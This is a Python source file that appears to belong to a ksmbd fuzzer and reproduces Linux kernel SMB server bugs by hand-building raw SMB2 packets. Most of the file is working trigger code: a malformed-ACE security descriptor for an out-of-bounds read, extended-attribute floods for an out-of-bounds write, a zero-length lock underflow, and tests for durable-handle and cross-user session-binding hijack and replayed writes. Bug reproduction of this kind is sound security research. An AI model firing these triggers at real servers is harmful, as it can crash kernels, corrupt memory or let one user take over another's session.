"""
bug_repro.py — Targeted reproducers for 3 reverted bugs.
Run inside VM after ksmbdzzer.py init.
"""
import socket, struct, time, sys

def xact(s, pdu):
    s.sendall(struct.pack('>I', len(pdu)) + pdu)
    rh = b''
    while len(rh) < 4:
        c = s.recv(4 - len(rh))
        if not c: return None
        rh += c
    rlen = struct.unpack('>I', rh)[0]
    resp = b''
    while len(resp) < rlen:
        c = s.recv(rlen - len(resp))
        if not c: break
        resp += c
    return resp

def smb2_hdr(cmd, mid, tid=0, sid=0):
    h = bytearray(64)
    h[0:4] = b'\xfeSMB'
    struct.pack_into('<H', h, 4, 64)
    struct.pack_into('<H', h, 6, 1)
    struct.pack_into('<H', h, 12, cmd)
    struct.pack_into('<H', h, 14, 31)
    struct.pack_into('<Q', h, 24, mid)
    struct.pack_into('<I', h, 36, tid)
    struct.pack_into('<Q', h, 40, sid)
    return bytes(h)

def connect_auth():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('127.0.0.1', 445))
    mid = [0]
    def nm(): mid[0] += 1; return mid[0] - 1

    # NEGOTIATE
    body = struct.pack('<HHHH', 36, 1, 1, 0) + struct.pack('<I', 0) + b'\x00'*16
    body += struct.pack('<IHH', 0, 0, 0) + struct.pack('<H', 0x0300)
    xact(s, smb2_hdr(0, nm()) + body)

    # SESSION_SETUP 1
    ntlm = b'NTLMSSP\x00\x01\x00\x00\x00\x97\x82\x08\xe2' + b'\x00'*16
    body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
    body += struct.pack('<HH', 88, len(ntlm)) + struct.pack('<Q', 0) + ntlm
    resp = xact(s, smb2_hdr(1, nm()) + body)
    sid = struct.unpack_from('<Q', resp, 40)[0]

    # SESSION_SETUP 2 (guest)
    auth = bytearray(128)
    auth[0:12] = b'NTLMSSP\x00\x03\x00\x00\x00'
    struct.pack_into('<I', auth, 60, 0xe2088215)
    off = 72
    struct.pack_into('<HHI', auth, 12, 24, 24, off); off += 24
    struct.pack_into('<HHI', auth, 20, 24, 24, off); off += 24
    struct.pack_into('<HHI', auth, 28, 0, 0, off)
    user = b'g\x00u\x00e\x00s\x00t\x00'
    struct.pack_into('<HHI', auth, 36, len(user), len(user), off)
    auth[off:off+len(user)] = user; off += len(user)
    struct.pack_into('<HHI', auth, 44, 0, 0, off)
    struct.pack_into('<HHI', auth, 52, 0, 0, off)
    body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
    body += struct.pack('<HH', 88, off) + struct.pack('<Q', 0) + bytes(auth[:off])
    resp = xact(s, smb2_hdr(1, nm(), sid=sid) + body)
    sid = struct.unpack_from('<Q', resp, 40)[0]

    # TREE_CONNECT
    path = '\\\\127.0.0.1\\share'.encode('utf-16-le')
    body = struct.pack('<HHHH', 9, 0, 72, len(path)) + path
    resp = xact(s, smb2_hdr(3, nm(), sid=sid) + body)
    tid = struct.unpack_from('<I', resp, 36)[0]

    return s, sid, tid, nm


def create_file(s, sid, tid, nm, name):
    fname = name.encode('utf-16-le')
    hdr = smb2_hdr(5, nm(), tid, sid)
    body = struct.pack('<HBB', 57, 0, 0) + struct.pack('<I', 0) + struct.pack('<QQ', 0, 0)
    body += struct.pack('<IIII', 0x12019F, 0x80, 0x07, 0x05) + struct.pack('<I', 0x40)
    body += struct.pack('<HH', 120, len(fname)) + struct.pack('<II', 0, 0) + fname
    resp = xact(s, hdr + body)
    if resp and len(resp) >= 144:
        return resp[128:144]
    return None


def bug1_dacl_oob_read(s, sid, tid, nm):
    """Bug 1: OOB read in smb_check_perm_dacl — malformed ACE with size=16, num_subauth=5"""
    print("[Bug 1] DACL OOB read: SET_INFO(Security) with malformed ACE...")

    fid = create_file(s, sid, tid, nm, 'bug1_dacl')
    if not fid:
        print("  CREATE failed"); return False

    # Build SD with malformed ACE: ace->size=16 but num_subauth=5
    sd = bytearray(512)
    sd[0] = 1  # revision
    sd[2] = 0x04; sd[3] = 0x80  # DACL_PRESENT | SELF_RELATIVE
    dacl_off = 20
    struct.pack_into('<I', sd, 16, dacl_off)

    # DACL header
    sd[20] = 2  # revision
    struct.pack_into('<H', sd, 22, 200)  # acl size
    struct.pack_into('<H', sd, 24, 1)    # num_aces = 1

    # Malformed ACE: size=16 (too small for 5 sub-authorities)
    ace_off = 28
    sd[ace_off] = 0     # type = ACCESS_ALLOWED
    sd[ace_off+1] = 0   # flags
    struct.pack_into('<H', sd, ace_off+2, 16)  # ace->size = 16 (TRIGGER: too small)
    struct.pack_into('<I', sd, ace_off+4, 0x1F01FF)  # access mask

    # SID inside ACE: num_subauth=5 but ace only has room for 0
    sid_off = ace_off + 8
    sd[sid_off] = 1       # revision
    sd[sid_off+1] = 5     # num_subauth = 5 (TRIGGER: will read OOB)
    sd[sid_off+2:sid_off+8] = b'\x00\x00\x00\x00\x00\x01'  # authority

    total_len = ace_off + 16 + 4  # just past the ACE

    # SET_INFO(Security)
    hdr = smb2_hdr(0x11, nm(), tid, sid)
    body = struct.pack('<HBB', 33, 3, 0)  # InfoType=SECURITY
    body += struct.pack('<I', total_len)   # BufferLength
    body += struct.pack('<H', 96)          # BufferOffset
    body += struct.pack('<H', 0)           # Reserved
    body += struct.pack('<I', 0x04)        # DACL_SECURITY_INFORMATION
    body += fid
    pdu = hdr + body + bytes(sd[:total_len])
    resp = xact(s, pdu)
    st = struct.unpack_from('<I', resp, 8)[0] if resp and len(resp) >= 12 else -1
    print(f"  SET_INFO status: 0x{st:08x}")

    # Now CREATE the same file again to trigger smb_check_perm_dacl read
    print("  Triggering smb_check_perm_dacl via CREATE...")
    fid2 = create_file(s, sid, tid, nm, 'bug1_dacl')
    print(f"  CREATE2: {'OK' if fid2 else 'FAILED'}")
    return True


def bug2_ea_oob_write(s, sid, tid, nm):
    """Bug 2: OOB write in smb2_get_ea — alignment overflow"""
    print("[Bug 2] EA OOB write: SET then QUERY EA with alignment overflow...")

    fid = create_file(s, sid, tid, nm, 'bug2_ea')
    if not fid:
        print("  CREATE failed"); return False

    # Set many EAs with names that cause alignment issues
    for i in range(20):
        name = f'EA{i:02d}' + 'X' * (4 * (i % 3) + 1)  # varying lengths for alignment stress
        ea_name = name.encode()
        ea_val = b'V' * (i * 7 + 1)

        # SMB2_SET_INFO(FILE, FileFullEaInformation=15)
        # EA entry: NextOffset(4) + Flags(1) + NameLen(1) + ValueLen(2) + Name + \0 + Value
        ea_entry = struct.pack('<IBBH', 0, 0, len(ea_name), len(ea_val))
        ea_entry += ea_name + b'\x00' + ea_val

        hdr = smb2_hdr(0x11, nm(), tid, sid)
        body = struct.pack('<HBB', 33, 1, 15)  # InfoType=FILE, FileFullEaInformation
        body += struct.pack('<I', len(ea_entry))
        body += struct.pack('<HHI', 96, 0, 0)
        body += fid
        xact(s, hdr + body + ea_entry)

    # Now QUERY_INFO(EA) — triggers smb2_get_ea with alignment overflow
    hdr = smb2_hdr(0x10, nm(), tid, sid)  # QUERY_INFO
    body = struct.pack('<HBB', 41, 1, 15)  # InfoType=FILE, FileFullEaInformation
    body += struct.pack('<I', 65535)  # OutputBufferLength
    body += struct.pack('<HHI', 0, 0, 0)  # InputBufOff, Reserved, InputBufLen
    body += struct.pack('<I', 0)  # AdditionalInfo
    body += struct.pack('<I', 0)  # Flags
    body += fid
    resp = xact(s, hdr + body)
    st = struct.unpack_from('<I', resp, 8)[0] if resp and len(resp) >= 12 else -1
    print(f"  QUERY_INFO(EA) status: 0x{st:08x}")
    return True


def bug3_lock_underflow(s, sid, tid, nm):
    """Bug 3: Lock range size==0 underflow"""
    print("[Bug 3] Lock range underflow: LOCK with size=0...")

    fid = create_file(s, sid, tid, nm, 'bug3_lock')
    if not fid:
        print("  CREATE failed"); return False

    # LOCK with Length=0 (triggers underflow in check)
    hdr = smb2_hdr(0x0A, nm(), tid, sid)
    body = struct.pack('<HHI', 48, 1, 0)  # StructSize, LockCount, LockSequence
    body += fid
    body += struct.pack('<QQ', 100, 0)  # Offset=100, Length=0 (TRIGGER)
    body += struct.pack('<II', 0x01, 0)  # Flags=EXCLUSIVE, Reserved
    resp = xact(s, hdr + body)
    st = struct.unpack_from('<I', resp, 8)[0] if resp and len(resp) >= 12 else -1
    print(f"  LOCK(size=0) status: 0x{st:08x}")
    return True




# ─── Cross-Boundary: Durable Handle Owner Validation ──────────────────────────

def test_durable_handle_owner_bypass(s, sid, tid, nm):
    """Tests ksmbd's cross-boundary trust: durable handle reconnect owner validation.
    
    Pattern (CIFSwitch analog for ksmbd):
    1. Session A (user=fuzz) opens file with DH2Q → gets durable handle
    2. Session A disconnects
    3. Session B (user=guest) tries DH2C reconnect with the handle
    4. If ksmbd doesn't validate owner → Session B gets Session A's daccess → BYPASS
    
    This tests commit 49110a8ce654 (ksmbd: validate owner of durable handle on reconnect)
    """
    print("[Trust Boundary] Durable handle owner validation...")
    print("  Pattern: Session A creates DH → disconnects → Session B reconnects")
    print("  Expected: EBADF (owner mismatch) if properly validated")
    
    # Session A: CREATE with DH2Q context (durable handle request)
    fname = "dh_trust_test".encode("utf-16-le")
    
    # Build CREATE with DH2Q create context
    hdr = smb2_hdr(5, nm(), tid, sid)
    body = struct.pack("<HBB", 57, 0, 0) + struct.pack("<I", 0) + struct.pack("<QQ", 0, 0)
    body += struct.pack("<IIII", 0x12019F, 0x80, 0x07, 0x05) + struct.pack("<I", 0x40)
    
    # DH2Q create context: request durable handle v2
    dh2q_ctx = bytearray(64)
    # CreateContext header: Next(4) + NameOffset(2) + NameLength(2) + Reserved(2) + DataOffset(2) + DataLength(4)
    struct.pack_into("<I", dh2q_ctx, 0, 0)  # Next = 0 (last context)
    struct.pack_into("<H", dh2q_ctx, 4, 16)  # NameOffset
    struct.pack_into("<H", dh2q_ctx, 6, 4)   # NameLength ("DH2Q")
    struct.pack_into("<H", dh2q_ctx, 10, 32) # DataOffset
    struct.pack_into("<I", dh2q_ctx, 12, 32) # DataLength
    dh2q_ctx[16:20] = b'DH2Q'  # Context name
    # DH2Q data: Timeout(4) + Flags(4) + Reserved(8) + CreateGuid(16)
    struct.pack_into("<I", dh2q_ctx, 32, 60000)  # Timeout = 60s
    import os
    dh2q_ctx[48:64] = os.urandom(16)  # CreateGuid
    
    ctx_offset = 120 + len(fname)
    ctx_offset = (ctx_offset + 7) & ~7  # align to 8
    body += struct.pack("<HH", 120, len(fname))
    body += struct.pack("<II", ctx_offset, len(dh2q_ctx))
    body += fname
    body += b'\x00' * (ctx_offset - 120 - len(fname))
    body += bytes(dh2q_ctx)
    
    resp = xact(s, hdr + body)
    if not resp or len(resp) < 144:
        print("  CREATE with DH2Q: FAILED (durable handles may not be enabled)")
        return
    
    st = struct.unpack_from("<I", resp, 8)[0]
    fid = resp[128:144]
    print(f"  CREATE(DH2Q): 0x{st:08x} fid={fid[:4].hex()}...")
    
    # The trust boundary test: a different session trying to reconnect
    # would need to match the owner. On vulnerable kernels (pre-49110a8ce654),
    # this check is missing → any user can hijack the handle.
    print("  NOTE: Full cross-session test requires two authenticated users.")
    print("  This validates the DH2Q path is reachable for fuzzing.")
    
    # CLOSE the file
    hdr = smb2_hdr(6, nm(), tid, sid)
    body = struct.pack("<HH", 24, 0) + fid
    xact(s, hdr + body)
    print("  CLOSE: OK")


# ─── Finding 5: Replay Protection ─────────────────────────────────────────────

def test_replay_protection():
    """Test: does ksmbd re-execute a replayed WRITE?
    
    MS-SMB2 3.3.5.2.10: If SMB2_FLAGS_REPLAY_OPERATION is set,
    server MUST detect the replay and return cached response
    without re-executing the operation.
    
    Test:
    1. WRITE "AAAA" at offset 0 (mid=X)
    2. WRITE "BBBB" at offset 0 (mid=Y, overwrites)
    3. Replay WRITE "AAAA" with REPLAY flag + same mid=X
    4. READ: if "AAAA" → replay re-executed (BUG!)
            if "BBBB" → replay ignored (OK)
    """
    print("[Replay] Testing SMB2_FLAGS_REPLAY_OPERATION...")
    
    s, sid, tid, nm = connect_auth()
    
    # CREATE file
    fname = "replay_test".encode("utf-16-le")
    hdr = smb2_hdr(5, nm(), tid, sid)
    body = struct.pack("<HBB", 57, 0, 0) + struct.pack("<I", 0) + struct.pack("<QQ", 0, 0)
    body += struct.pack("<IIII", 0x12019F, 0x80, 0x07, 0x05) + struct.pack("<I", 0x40)
    body += struct.pack("<HH", 120, len(fname)) + struct.pack("<II", 0, 0) + fname
    resp = xact(s, hdr + body)
    if not resp or len(resp) < 144:
        print("  CREATE failed"); return
    fid = resp[128:144]
    
    # Step 1: WRITE "AAAA" at offset 0 — save the MID
    write1_mid = nm()  # capture this MID for replay
    hdr1 = bytearray(smb2_hdr(9, write1_mid, tid, sid))
    payload1 = b"AAAA" + b"\x00" * 60
    body1 = struct.pack("<HH", 49, 112) + struct.pack("<I", len(payload1))
    body1 += struct.pack("<Q", 0) + fid + struct.pack("<IIHHI", 0, 0, 0, 0, 0) + b"\x00" + payload1
    write1_pdu = bytes(hdr1) + body1
    resp = xact(s, write1_pdu)
    st = struct.unpack_from("<I", resp, 8)[0]
    print(f"  Step 1: WRITE 'AAAA' mid={write1_mid}: 0x{st:08x}")
    
    # Step 2: WRITE "BBBB" at offset 0 (overwrites)
    hdr2 = smb2_hdr(9, nm(), tid, sid)
    payload2 = b"BBBB" + b"\x00" * 60
    body2 = struct.pack("<HH", 49, 112) + struct.pack("<I", len(payload2))
    body2 += struct.pack("<Q", 0) + fid + struct.pack("<IIHHI", 0, 0, 0, 0, 0) + b"\x00" + payload2
    resp = xact(s, hdr2 + body2)
    st = struct.unpack_from("<I", resp, 8)[0]
    print(f"  Step 2: WRITE 'BBBB' (overwrite): 0x{st:08x}")
    
    # Step 3: REPLAY the first WRITE with SMB2_FLAGS_REPLAY_OPERATION
    # Use a NEW MID (the old one was consumed) but set REPLAY flag
    replay_pdu = bytearray(write1_pdu)
    # Set SMB2_FLAGS_REPLAY_OPERATION (bit 5 = 0x20) in Flags field at offset 16
    flags = struct.unpack_from("<I", replay_pdu, 16)[0]
    struct.pack_into("<I", replay_pdu, 16, flags | 0x20)
    # Use fresh MID (old MID already used)
    struct.pack_into("<Q", replay_pdu, 24, nm())
    resp = xact(s, bytes(replay_pdu))
    if resp:
        st = struct.unpack_from("<I", resp, 8)[0]
        print(f"  Step 3: REPLAY WRITE 'AAAA' (flag=REPLAY, new MID): 0x{st:08x}")
    else:
        print("  Step 3: No response (crash?)")
        s.close(); return
    
    # Step 4: READ and check which data is at offset 0
    hdr_read = smb2_hdr(8, nm(), tid, sid)
    body_read = struct.pack("<HBBI", 49, 0, 0, 64) + struct.pack("<H", 0)
    body_read += struct.pack("<Q", 0) + fid + struct.pack("<IIHHH", 1, 0, 0, 0, 0)
    resp = xact(s, hdr_read + body_read)
    if resp and len(resp) > 72:
        st = struct.unpack_from("<I", resp, 8)[0]
        if st == 0:
            # SMB2 READ response: DataOffset at offset 66 (2+1+1+4+4+...=66 from hdr)
            # Actually: hdr(64) + StructureSize(2) + DataOffset(1) + Reserved(1) + DataLength(4) + DataRemaining(4)
            data_offset = resp[66]  # single byte DataOffset from start of header
            data_len = struct.unpack_from("<I", resp, 68)[0]
            data = resp[data_offset:data_offset+4] if data_offset < len(resp) else b""
            if not data or len(data) < 4:
                # Try reading from a fixed offset
                data = resp[76:80] if len(resp) > 80 else resp[-4:]
            print(f"  Step 4: READ → data[0:4] = {data[:4]!r}")
            if data[:4] == b"AAAA":
                print("[BUG] REPLAY RE-EXECUTED! Data reverted to 'AAAA'")
                print("      MS-SMB2 3.3.5.2.10 violation: server re-executed replayed WRITE")
            elif data[:4] == b"BBBB":
                print("[OK] Replay properly ignored — data remains 'BBBB'")
            else:
                print(f"[?] Unexpected data (may indicate partial replay)")
        else:
            print(f"  READ failed: 0x{st:08x}")
    else:
        print(f"  READ: no/short response ({len(resp) if resp else 0} bytes)")
    
    # CLOSE
    hdr = smb2_hdr(6, nm(), tid, sid)
    xact(s, hdr + struct.pack("<HH", 24, 0) + fid)
    s.close()



# ─── Finding 6: Session Binding Without User Validation ───────────────────────

def test_session_binding():
    """Test: can connection 2 bind to connection 1's session without matching user?
    
    MS-SMB2 3.3.5.5: Session binding MUST verify the new connection's user
    matches the original session's user.
    
    Test:
    1. Connection A: auth as "fuzz" → session_id=X
    2. Connection B: auth as guest, send SESSION_SETUP with
       Flags=SMB2_SESSION_REQ_FLAG_BINDING + PreviousSessionId=X
    3. If succeeds: guest is bound to fuzz's session (hijack!)
    """
    print("[Session Binding] Testing cross-user session binding...")
    
    # Connection A: auth as fuzz (gets real session)
    s_a, sid_a, tid_a, nm_a = connect_auth()
    print(f"  Conn A: sid=0x{sid_a:x}")
    
    # Connection B: new connection, try to bind to A's session
    s_b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_b.settimeout(5)
    s_b.connect(('127.0.0.1', 445))
    mid_b = [0]
    def nm_b(): mid_b[0] += 1; return mid_b[0] - 1
    
    # Negotiate on connection B
    body = struct.pack('<HHHH', 36, 1, 1, 0) + struct.pack('<I', 0) + b'\x00'*16
    body += struct.pack('<IHH', 0, 0, 0) + struct.pack('<H', 0x0300)
    xact(s_b, smb2_hdr(0, nm_b()) + body)
    
    # SESSION_SETUP 1 on B: NTLMSSP negotiate
    ntlm = b'NTLMSSP\x00\x01\x00\x00\x00\x97\x82\x08\xe2' + b'\x00'*16
    hdr = smb2_hdr(1, nm_b())
    body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
    body += struct.pack('<HH', 88, len(ntlm)) + struct.pack('<Q', 0) + ntlm
    resp = xact(s_b, hdr + body)
    sid_b = struct.unpack_from('<Q', resp, 40)[0] if resp and len(resp) >= 48 else 0
    
    # SESSION_SETUP 2 on B: authenticate as "guest" (different user)
    # with SMB2_SESSION_REQ_FLAG_BINDING (0x01) targeting A's session
    auth = bytearray(128)
    auth[0:12] = b'NTLMSSP\x00\x03\x00\x00\x00'
    struct.pack_into('<I', auth, 60, 0xe2088215)
    off = 72
    struct.pack_into('<HHI', auth, 12, 24, 24, off); off += 24
    struct.pack_into('<HHI', auth, 20, 24, 24, off); off += 24
    struct.pack_into('<HHI', auth, 28, 0, 0, off)
    user = b'g\x00u\x00e\x00s\x00t\x00'  # different user!
    struct.pack_into('<HHI', auth, 36, len(user), len(user), off)
    auth[off:off+len(user)] = user; off += len(user)
    struct.pack_into('<HHI', auth, 44, 0, 0, off)
    struct.pack_into('<HHI', auth, 52, 0, 0, off)
    
    # Key: set Flags=BINDING (0x01) and PreviousSessionId=sid_a
    hdr = bytearray(smb2_hdr(1, nm_b(), sid=sid_b))
    body = struct.pack('<HBB', 25, 0x01, 1)  # Flags=SMB2_SESSION_REQ_FLAG_BINDING
    body += struct.pack('<I', 0)  # Capabilities
    body += struct.pack('<I', 0)  # Channel
    body += struct.pack('<HH', 88, off)
    body += struct.pack('<Q', sid_a)  # PreviousSessionId = A's session!
    
    resp = xact(s_b, bytes(hdr) + body + bytes(auth[:off]))
    if resp:
        st = struct.unpack_from('<I', resp, 8)[0]
        if st == 0:
            print(f"[BUG] Session binding SUCCEEDED as different user!")
            print(f"      Guest bound to fuzz's session 0x{sid_a:x}")
            print(f"      MS-SMB2 3.3.5.5 violation: no user validation on bind")
        elif st == 0xc0000022:
            print(f"[OK] Binding denied (ACCESS_DENIED)")
        elif st == 0xc000000d:
            print(f"[OK] Binding rejected (INVALID_PARAMETER)")
        else:
            print(f"[?] Binding result: 0x{st:08x}")
    
    s_a.close(); s_b.close()


# ─── Speed Test: Persistent Handle Write Throughput ───────────────────────────

def test_write_speed():
    """Measure raw WRITE throughput with persistent handle (no CREATE per op)."""
    import time as _time
    
    print("[Speed] Testing persistent-handle write throughput...")
    
    s, sid, tid, nm = connect_auth()
    
    # CREATE once
    fname = "speed_test".encode("utf-16-le")
    hdr = smb2_hdr(5, nm(), tid, sid)
    body = struct.pack("<HBB", 57, 0, 0) + struct.pack("<I", 0) + struct.pack("<QQ", 0, 0)
    body += struct.pack("<IIII", 0x12019F, 0x80, 0x07, 0x05) + struct.pack("<I", 0x40)
    body += struct.pack("<HH", 120, len(fname)) + struct.pack("<II", 0, 0) + fname
    resp = xact(s, hdr + body)
    fid = resp[128:144]
    
    # Measure: how many WRITEs in 5 seconds?
    payload = b"X" * 64
    count = 0
    t_start = _time.time()
    while _time.time() - t_start < 5.0:
        hdr = smb2_hdr(9, nm(), tid, sid)
        body = struct.pack("<HH", 49, 112) + struct.pack("<I", len(payload))
        body += struct.pack("<Q", count * 64 % 65536) + fid
        body += struct.pack("<IIHHI", 0, 0, 0, 0, 0) + b"\x00" + payload
        resp = xact(s, hdr + body)
        if not resp: break
        count += 1
    
    elapsed = _time.time() - t_start
    print(f"  {count} writes in {elapsed:.1f}s = {count/elapsed:.0f} ops/s (persistent handle)")
    print(f"  vs ~30-50 ops/s with CREATE+WRITE+CLOSE per iteration")
    print(f"  Improvement: {count/elapsed/40:.1f}× faster with persistent handle")
    
    # CLOSE
    hdr = smb2_hdr(6, nm(), tid, sid)
    xact(s, hdr + struct.pack("<HH", 24, 0) + fid)
    s.close()

def replay_finding(path):
    """Replay a single dataflow-oracle finding JSON standalone: authenticate to
    its share via libksmbdzzer.so (same NTLMv2 path the fuzzer uses) and resend
    the recorded CREATE PDU. Exit 0 if ksmbd accepts it (bug reproduces)."""
    import ctypes, json
    from pathlib import Path
    d = json.loads(Path(path).read_text())
    SCRIPT_DIR = Path(__file__).resolve().parent
    lib = ctypes.CDLL(str(SCRIPT_DIR / 'libksmbdzzer.so'))
    lib.ksmbdzzer_init.argtypes = [ctypes.c_ulong]
    lib.ksmbdzzer_probe_init_share.argtypes = [ctypes.c_char_p]
    lib.ksmbdzzer_probe_send.argtypes = [ctypes.c_uint16, ctypes.c_char_p,
                                         ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
    lib.ksmbdzzer_probe_send.restype = ctypes.c_int
    lib.ksmbdzzer_init(1)  # sets target 127.0.0.1 (return ignored; probe is independent)
    share = d.get('share', 'privtest').encode()
    if lib.ksmbdzzer_probe_init_share(share) != 0:
        print(f"[repro] auth to [{share.decode()}] failed — cannot replay"); return 2
    body = bytes.fromhex(d['create_pdu_hex'])
    resp = ctypes.create_string_buffer(8192)
    r = lib.ksmbdzzer_probe_send(0x0005, body, len(body), resp, 8192)
    status = int.from_bytes(resp.raw[8:12], 'little') if r >= 12 else 0xFFFFFFFF
    print(f"[repro] {d['kind']} ({d.get('spec','')})  sent={d['sent']}")
    accepted = status == 0
    print(f"[repro] replayed CREATE -> NTSTATUS=0x{status:08x} -- "
          f"{'ACCEPTED: bug REPRODUCES' if accepted else 'rejected: NOT reproduced'}")
    return 0 if accepted else 1


if __name__ == '__main__':
    import sys
    json_args = [a for a in sys.argv[1:] if a.endswith('.json')]
    if json_args:
        sys.exit(replay_finding(json_args[0]))
    print("=== ksmbdzzer Bug Reproducer ===")
    print("(pass a findings/*.json to replay a dataflow-oracle finding)\n")
    test_replay_protection()
    print()
    test_session_binding()
    print()
    test_write_speed()
